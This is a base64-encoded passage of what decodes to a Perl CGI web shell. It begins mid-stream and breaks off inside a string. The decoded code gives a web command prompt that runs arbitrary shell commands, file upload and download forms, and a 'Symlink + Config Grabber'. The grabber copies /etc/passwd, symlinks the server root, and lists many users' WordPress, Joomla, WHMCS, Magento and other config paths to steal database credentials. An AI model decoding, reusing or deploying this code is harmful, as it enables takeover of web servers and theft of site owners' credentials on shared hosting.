bTNkbnJ4T3hzOU5Rc0drN3hpNjZxNFZxcHlSMVE4VVc0YWduSk5TdWRZaVhGWEcxSmxGV04vNTAxUmNlSUs0R1BjQTdHUGlmMmNNZ0FQeWhRUjhJc2g4WWhlWTJRaHRLVjNXODNvTXhHSTBzRXpCZVdhWmdzckRNd0hSdUtjRnNacG1EY213NUFQUGxuNW9LOVFiaUJrcXNBQUFCVXFaMVdnQUEpIGZvcm1hdCgnd29mZicpOw0KICAgIGZvbnQtd2VpZ2h0OiBub3JtYWw7DQogICAgZm9udC1zdHlsZTogbm9ybWFsOw0KDQp9DQoNCmJvZHkgew0KZm9udC1mYW1pbHk6ICJ1YnVudHVfbW9ub3JlZ3VsYXIiOw0KZm9udC1zaXplOjEycHg7DQpiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0Ow0KYmFja2dyb3VuZC1hdHRhY2htZW50OiBmaXhlZDsNCmJhY2tncm91bmQtcG9zaXRpb246IGNlbnRlcjsNCmJhY2tncm91bmQtY29sb3I6IzJkMmIyYjsNCmNvbG9yOmxpbWU7DQpiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsNCn0NCiNuYXZ7cG9zaXRpb246Zml4ZWQ7ei1pbmRleDo5OTk7dG9wOjA7d2lkdGg6MTAwJTtsZWZ0OjcwJTsNCn0NCmEubmF2LWZva3VzIHtkaXNwbGF5OmJsb2NrOyB3aWR0aDphdXRvOyBoZWlnaHQ6YXV0bzsgYmFja2dyb3VuZDojMTkxOTE5OyBib3JkZXItdG9wOjBweDsgYm9yZGVyLWxlZnQ6IDFweCBzb2xpZCAjZmZmOyBib3JkZXItcmlnaHQ6MXB4IHNvbGlkICNmZmY7ICBib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZmZmOyAgcGFkZGluZzo1cHggOHB4OyB0ZXh0LWFsaWduOmNlbnRlcjsgdGV4dC1kZWNvcmF0aW9uOm5vbmU7IGNvbG9yOnJlZDsgbGluZS1oZWlnaHQ6MjBweDsgb3ZlcmZsb3c6aGlkZGVuOyBmbG9hdDpsZWZ0Ow0KfQ0KYS5uYXYtZm9rdXM6aG92ZXIge2NvbG9yOiNGRkZGRkY7IGJhY2tncm91bmQ6IzE5MTkxOTsgYm9yZGVyLXRvcDowcHg7IGJvcmRlci1sZWZ0OiAxcHggc29saWQgI2ZmZjsgYm9yZGVyLXJpZ2h0OjFweCBzb2xpZCAjZmZmOyAgYm9yZGVyLWJvdHRvbToxcHggc29saWQgI2ZmZjsNCn0NCmlucHV0W3R5cGU9dGV4dF17DQoJYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IA0KCWNvbG9yOndoaXRlOw0KCW1hcmdpbjowIDEwcHg7DQoJZm9udC1mYW1pbHk6SG9tZW5hamU7DQoJZm9udC1zaXplOjEzcHg7DQoJYm9yZGVyOm5vbmU7DQp9DQppbnB1dFt0eXBlPXN1Ym1pdF0gew0KCWJhY2tncm91bmQ6IGJsYWNrOyANCgljb2xvcjp3aGl0ZTsNCgltYXJnaW46MCAxMHB4Ow0KCWZvbnQtZmFtaWx5OkhvbWVuYWplOw0KCWZvbnQtc2l6ZToxM3B4Ow0KCWJvcmRlcjpub25lOw0KDQo8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IjJkMmIyYiIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4NCjxkaXYgaWQ9Im5hdiI+DQo8YSBjbGFzcz0ibmF2LWZva3VzIiBocmVmPSIkU2NyaXB0TG9jYXRpb24/Ij48Yj5Ib21lPC9iPjwvYT4NCjxhIGNsYXNzPSJuYXYtZm9rdXMiIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWhlbHAiPjxiPkhlbHA8L2I+PC9hPg0KPGEgY2xhc3M9Im5hdi1mb2t1cyIgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkIj48Yj5VcGxvYWQ8L2I+PC9hPg0KPGEgY2xhc3M9Im5hdi1mb2t1cyIgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQiPjxiPkRvd25sb2FkPC9iPjwvYT4NCjxhIGNsYXNzPSJuYXYtZm9rdXMiIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXN5bWNvbmZpZyI+PGI+U3ltbGluayArIENvbmZpZyBHcmFiYmVyPC9iPjwvYT48L2Rpdj4NCjxicj4NCjxmb250IGNvbG9yPSJsaW1lIiBzaXplPSIzIj4NCkVORA0KfQ0Kc3ViIFByaW50UGFnZUZvb3Rlcg0Kew0KcHJpbnQgIjwvZm9udD48L2JvZHk+PC9odG1sPiI7DQp9DQoNCnN1YiBHZXRDb29raWVzDQp7DQpAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOw0KZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykNCnsNCigkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCiRDb29raWVzeyRpZH0gPSAkdmFsOw0KfQ0KfQ0KDQpzdWIgUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybQ0Kew0KJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQogICAgcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSI/Ij4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJjb21tYW5kIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQokUHJvbXB0DQo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iYyI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQ0Kew0KJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwgIjsNCnByaW50IDw8RU5EOw0KPGNvZGU+PGNlbnRlcj48YnI+DQo8Zm9udCBjb2xvcj1saW1lPjxiPjxpPjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjwvZm9ybT4NCjwvaT48L2I+PC9mb250PjwvY2VudGVyPg0KPC9jb2RlPg0KRU5EDQp9DQoNCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtDQp7DQokUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCnByaW50IDw8RU5EOw0KPGNvZGU+PGJyPjxjZW50ZXI+PGZvbnQgY29sb3I9bGltZT48Yj48aT48Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCiRQcm9tcHQgdXBsb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiA8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPg0KT3ZlcndyaXRlIGlmIGl0IEV4aXN0czxicj48YnI+DQpVcGxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9InVwbG9hZCI+DQo8L2Zvcm0+PC9pPjwvYj48L2ZvbnQ+DQo8L2NlbnRlcj4NCjwvY29kZT4NCkVORA0KfQ0KDQpzdWIgQ29tbWFuZFRpbWVvdXQNCnsNCmlmKCEkV2luTlQpDQp7DQphbGFybSgwKTsNCnByaW50IDw8RU5EOw0KPC94bXA+DQo8Y29kZT4NCkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS4NCjxicj5LaWxsZWQgaXQhDQo8Y29kZT4NCkVORA0KJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KZXhpdDsNCn0NCn0NCnN1YiBFeGVjdXRlQ29tbWFuZA0Kew0KICAgaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZA0KICAgIHsNCiAgICAgICAgIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQ0KICAgICAgICAjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4NCiAgICAgICANCiAgICAgICAgJE9sZERpciA9ICRDdXJyZW50RGlyOw0KICAgICAgICAkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQogICAgICAgIGNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCiAgICAgICAgJlByaW50UGFnZUhlYWRlcigiYyIpOw0KICAgICAgICAkUHJvbXB0ID0gJFdpbk5UID8gIiRPbGREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkT2xkRGlyXVwkICI7DQogICAgICAgIHByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPiI7DQogICAgfQ0KICAgIGVsc2UgIyBzb21lIG90aGVyIGNvbW1hbmQsIGRpc3BsYXkgdGhlIG91dHB1dA0KICAgIHsNCiAgICAgICAgJlByaW50UGFnZUhlYWRlcigiYyIpOw0KICAgICAgICAkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCiAgICAgICAgcHJpbnQgIjxjb2RlPiRQcm9tcHQgJFJ1bkNvbW1hbmQ8L2NvZGU+PHhtcD4iOw0KICAgICAgICAkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7DQogICAgICAgIGlmKCEkV2luTlQpDQogICAgICAgIHsNCiAgICAgICAgICAgICRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7DQogICAgICAgICAgICBhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQogICAgICAgIH0NCiAgICAgICAgaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZA0KICAgICAgICB7DQogICAgICAgICAgICAkfD0xOw0KICAgICAgICAgICAgJENvbW1hbmQgLj0gIiB8IjsNCiAgICAgICAgICAgIG9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KICAgICAgICAgICAgd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICRfID1+IHMvKFxufFxyXG4pJC8vOw0KICAgICAgICAgICAgICAgIHByaW50ICIkX1xuIjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICR8PTA7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzDQogICAgICAgIHsNCiAgICAgICAgICAgIHByaW50IGAkQ29tbWFuZGA7DQogICAgICAgIH0NCiAgICAgICAgaWYoISRXaW5OVCkNCiAgICAgICAgew0KICAgICAgICAgICAgYWxhcm0oMCk7DQogICAgICAgIH0NCiAgICAgICAgcHJpbnQgIjwveG1wPiI7DQogICAgfQ0KICAgICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KICAgICZQcmludFBhZ2VGb290ZXI7DQp9DQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlDQp7DQpsb2NhbCgkRmlsZVVybCkgPSBAXzsNCmlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cw0Kew0KIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3Nlcg0KJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsNCiZQcmludFBhZ2VIZWFkZXIoImMiKTsNCnByaW50IDw8RU5EOw0KPGNvZGU+DQpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4NCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LA0KPGEgaHJlZj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4uDQo8L2NvZGU+DQpFTkQNCiZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCmVsc2UgIyBmaWxlIGRvZXNuJ3QgZXhpc3QNCnsNCiZQcmludFBhZ2VIZWFkZXIoImYiKTsNCnByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhPC9jb2RlPiI7DQomUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCnN1YiBTeW1Db25maWcNCnsNCiMhL3Vzci9iaW4vcGVybCAtSS91c3IvbG9jYWwvYmFuZG1pbg0KdXNlIEZpbGU6OkNvcHk7IHVzZSBzdHJpY3Q7IHVzZSB3YXJuaW5nczsgdXNlIE1JTUU6OkJhc2U2NDsNCm15ICRmaWxlbmFtZSA9ICdwYXNzd2QudHh0JzsNCmlmICghLWUgJGZpbGVuYW1lKSB7IGNvcHkoIi9ldGMvcGFzc3dkIiwicGFzc3dkLnR4dCIpIDsNCn0NCm1rZGlyICJzeW1saW5rX2NvbmZpZyI7DQpzeW1saW5rKCIvIiwic3ltbGlua19jb25maWcvcm9vdCIpOw0KbXkgJGh0YWNjZXNzID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCamIyNDNaWGgwTG1oMGJRMEtRV1JrVkhsd1pTQjBaWGgwTDNCc1lXbHVJQzV3YUhBZ0RRcEJaR1JJWVc1a2JHVnlJSFJsZUhRdmNHeGhhVzRnTG5Cb2NBMEtVMkYwYVhObWVTQkJibmtOQ2tsdVpHVjRUM0IwYVc5dWN5QXJRMmhoY25ObGREMVZWRVl0T0NBclJtRnVZM2xKYm1SbGVHbHVaeUFyU1dkdWIzSmxRMkZ6WlNBclJtOXNaR1Z5YzBacGNuTjBJQ3RZU0ZSTlRDQXJTRlJOVEZSaFlteGxJQ3RUZFhCd2NtVnpjMUoxYkdWeklDdFRkWEJ3Y21WemMwUmxjMk55YVhCMGFXOXVJQ3RPWVcxbFYybGtkR2c5S2lBTkNrbHVaR1Y0U1dkdWIzSmxJQ291ZEhoME5EQTBEUXBTWlhkeWFYUmxSVzVuYVc1bElFOXVEUXBTWlhkeWFYUmxRMjl1WkNBbGUxSkZVVlZGVTFSZlJrbE1SVTVCVFVWOUlGNHVLbk41Yld4cGJtdGZZMjl1Wm1sbklGdE9RMTBOQ2xKbGQzSnBkR1ZTZFd4bElGd3VkSGgwSkNBbGUxSkZVVlZGVTFSZlZWSkpmVFF3TkNCYlRDeFNQVE13TWk1T1ExMD0iKTsNCm15ICR4c3ltNDA0ID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCamIyNDNaWGgwTG1oMGJRMEtTR1ZoWkdWeVRtRnRaU0J3Y0hFdWRIaDBEUXBUWVhScGMyWjVJRUZ1ZVEwS1NXNWtaWGhQY0hScGIyNXpJRWxuYm05eVpVTmhjMlVnUm1GdVkzbEpibVJsZUdsdVp5QkdiMnhrWlhKelJtbHljM1FnVG1GdFpWZHBaSFJvUFNvZ1JHVnpZM0pwY0hScGIyNVhhV1IwYUQwcUlGTjFjSEJ5WlhOelNGUk5URkJ5WldGdFlteGxEUXBKYm1SbGVFbG5ibTl5WlNBcSIpOw0Kb3BlbihteSAkZmgxLCAnPicsICdzeW1saW5rX2NvbmZpZy8uaHRhY2Nlc3MnKTsgcHJpbnQgJGZoMSAiJGh0YWNjZXNzIjsgY2xvc2UgJGZoMTsgb3BlbihteSAkeHgsICc+JywgJ3N5bWxpbmtfY29uZmlnL25lbXUudHh0Jyk7IHByaW50ICR4eCAiJHhzeW00MDQiOyBjbG9zZSAkeHg7IG9wZW4obXkgJGZoLCAnPDplbmNvZGluZyhVVEYtOCknLCAkZmlsZW5hbWUpOyB3aGlsZSAobXkgJHJvdyA9IDwkZmg+KSB7IG15IEBtYXRjaGVzID0gJHJvdyA9fiAvKC4qPyk6eDovZzsgbXkgJHVzZXJueWEgPSAkMTsgbXkgQGFycmF5ID0gKCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvLmFjY2Vzc2hhc2gnLCB0eXBlID0+ICdXSE0tYWNjZXNzaGFzaCcgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsIHR5cGUgPT4gJ0xva29tZWRpYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2xpYi9jb25maWcucGhwJywgdHlwZSA9PiAnQmFsaXRiYW5nJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCB0eXBlID0+ICdQcmVzdGFTaG9wJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwL2V0Yy9sb2NhbC54bWwnLCB0eXBlID0+ICdNYWdlbnRvJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsIHR5cGUgPT4gJ09wZW5DYXJ0JyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwbGljYXRpb24vY29uZmlnL2RhdGFiYXNlLnBocCcsIHR5cGUgPT4gJ0VsbGlzbGFiJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dwL3Rlc3Qvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BvcnRhbC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dQL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RlbW8vd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YxL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92Mi93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmxvZy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdeV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iZXRhL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcG9ydGFsL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZGVtby9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3Rlc3QvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92MS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YyL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV0hNQ1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htY3MxL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITUMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2